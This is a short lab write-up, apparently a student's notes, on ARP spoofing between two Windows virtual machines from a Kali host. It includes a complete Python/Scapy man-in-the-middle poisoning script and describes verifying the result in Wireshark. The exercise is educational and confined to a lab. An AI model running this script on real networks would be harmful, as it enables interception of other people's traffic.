### tools
- [[python]]
	- [[Scapy]]
- [[Wireshark]]
### Objective 
- Using the given script try to spoof the arp-requests between two windows virtual machines
- using Wireshark to check the eth0 

### Step by step
- Setting up the virtual machines in NAT network 
	- Kali 10.0.0.128
	- Win-10 10.0.0.4
	- Win Server 10.0.0.3
- using the python scrip: 
``` python 
#!/usr/bin/env python3

import scapy.all as scapy
import time
import logging
import sys

# Silenzia i log di scapy
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_mac(ip):
    """Ottiene il MAC address di un IP tramite richiesta broadcast."""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        # Estrae l'indirizzo hardware (MAC) dalla risposta
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_host, spoof_host):
    """Invia un pacchetto ARP fasullo al target."""
    target_mac = get_mac(target_host)
    if not target_mac:
        print(f"\r[!] Impossibile trovare il MAC per {target_host}. Salto...", end="")
        return
    
    # Crea il pacchetto ARP avvelenato
    packet = scapy.ARP(op=2, pdst=target_host, hwdst=target_mac, psrc=spoof_host)
    scapy.send(packet, verbose=False)

def clean_target_arp_table(destination_host, source_host):
    """Ripristina la tabella ARP originale inviando i MAC corretti."""
    destination_mac = get_mac(destination_host)
    source_mac = get_mac(source_host)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_host, hwdst=destination_mac, 
                           psrc=source_host, hwsrc=source_mac)
        scapy.send(packet, count=5, verbose=False)

# --- CONFIGURAZIONE TARGET ---
packet_counter = 0
target1_host = "10.0.0.3" 
target2_host = "10.0.0.4" 

try:
    print(f"[+] Avvio spoofing tra {target1_host} e {target2_host}...")
    while True:
        # Avvelena entrambi i target per metterti nel mezzo
        spoof(target1_host, target2_host)
        spoof(target2_host, target1_host)
 
        packet_counter += 2
        print(f"\r[+] Pacchetti inviati: {packet_counter}", end="")
        sys.stdout.flush() 
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Interruzione rilevata. Ripristino in corso...")
    clean_target_arp_table(target1_host, target2_host)
    clean_target_arp_table(target2_host, target1_host)
    print("[+] Tabelle ARP ripristinate. Esco.")#!/usr/bin/env python3
```
- Use the script
- Sniff the eth0 traffic with Wireshark 
	- ![[Screenshot 2026-02-26 120811 1.png]] 
	- here we can see the interaction between the machines and the kali
	- In all of this we can see the answer from the kali machine replying with it's mac
- the project was successful 
	- ![[Screenshot 2026-02-26 124357.png]]
	- we can see that the Mac address of 10.0.0.3 , inside win10, is the one of kali 
	